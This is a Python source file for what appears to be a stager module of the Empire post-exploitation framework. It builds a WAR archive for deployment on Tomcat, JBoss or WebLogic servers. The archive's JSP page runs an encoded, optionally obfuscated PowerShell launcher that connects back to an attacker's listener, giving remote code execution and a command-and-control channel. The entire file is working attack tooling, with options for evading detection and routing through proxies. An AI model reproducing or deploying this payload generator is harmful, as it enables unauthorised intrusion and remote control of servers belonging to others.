from lib.common import helpers
import zipfile
import StringIO

class Stager:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'WAR',

            'Author': ['Andrew @ch33kyf3ll0w Bonstrom'],

            'Description': ('Generates a Deployable War file.'),

            'Comments': [
                'You will need to deploy the WAR file to activate. Great for interfaces that accept a WAR file such as Apache Tomcat, JBoss, or Oracle Weblogic Servers.'
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Language' : {
                'Description'   :   'Language of the stager to generate.',
                'Required'      :   True,
                'Value'         :   'powershell'
            },
            'StagerRetries' : {
                'Description'   :   'Times for the stager to retry connecting.',
                'Required'      :   False,
                'Value'         :   '0'
            },
            'AppName' : {
                'Description'   :   'Name for the .war/.jsp. Defaults to listener name.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'OutFile' : {
                'Description'   :   'File to write .war to.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Obfuscate' : {
                'Description'   :   'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
                'Required'      :   False,
                'Value'         :   'False'
            },
            'ObfuscateCommand' : {
                'Description'   :   'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
                'Required'      :   False,
                'Value'         :   r'Token\All\1,Launcher\STDIN++\1234567'
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):

        # extract all of our options
        language = self.options['Language']['Value']
        listenerName = self.options['Listener']['Value']
        appName = self.options['AppName']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
        stagerRetries = self.options['StagerRetries']['Value']
        obfuscate = self.options['Obfuscate']['Value']
        obfuscateCommand = self.options['ObfuscateCommand']['Value']

        obfuscateScript = False
        if obfuscate.lower() == "true":
            obfuscateScript = True

        # appName defaults to the listenername
        if appName == "":
            appName = listenerName

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, obfuscate=obfuscate, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)

        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""

        else:
            # .war manifest
            manifest = "Manifest-Version: 1.0\r\nCreated-By: 1.6.0_35 (Sun Microsystems Inc.)\r\n\r\n"

            # Create initial JSP and Web XML Strings with placeholders
            jspCode = '''<%@ page import="java.io.*" %>
<% 
Process p=Runtime.getRuntime().exec("'''+str(launcher)+'''");
%>
'''

            # .xml deployment config
            wxmlCode = '''<?xml version="1.0"?>
<!DOCTYPE web-app PUBLIC 
"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" 
"http://java.sun.com/dtd/web-app_2_3.dtd">
<web-app>
<servlet>
<servlet-name>%s</servlet-name>
<jsp-file>/%s.jsp</jsp-file>
</servlet>
</web-app>
''' %(appName, appName)

            # build the in-memory ZIP and write the three files in
            warFile = StringIO.StringIO() 
            zipData = zipfile.ZipFile(warFile, 'w', zipfile.ZIP_DEFLATED)

            zipData.writestr("META-INF/MANIFEST.MF", manifest)
            zipData.writestr("WEB-INF/web.xml", wxmlCode)
            zipData.writestr("%s.jsp" % (appName), jspCode)
            zipData.close()

            return warFile.getvalue()
